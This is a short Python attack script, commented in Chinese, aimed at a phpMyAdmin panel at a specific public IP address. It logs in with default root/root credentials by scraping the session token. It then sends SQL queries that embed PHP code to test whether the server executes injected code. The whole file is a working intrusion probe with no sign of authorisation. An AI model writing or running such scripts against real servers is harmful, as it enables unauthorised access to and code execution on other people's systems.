#!/usr/bin/env python3
"""决定性测试: echo 计算结果,payload不含结果值
执行了 -> 响应含 VAL_369
没执行 -> 只有原文 VAL_ + (123*3)
"""
import urllib.request, http.cookiejar, re, urllib.parse

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

r = sql("SELECT '<?php echo \"VAL_\" . (123*3);?>'")
print("响应含VAL_369(执行):", "VAL_369" in r)
print("响应含VAL_原文(未执行):", "VAL_&quot;" in r or "VAL_\" ." in r)
print("响应含123*3:", "123*3" in r or "123%2A3" in r or "123&#" in r)
# 找所有VAL_出现位置
for m in re.finditer(r'VAL_[^<]{0,20}', r):
    print("  found:", m.group(0))
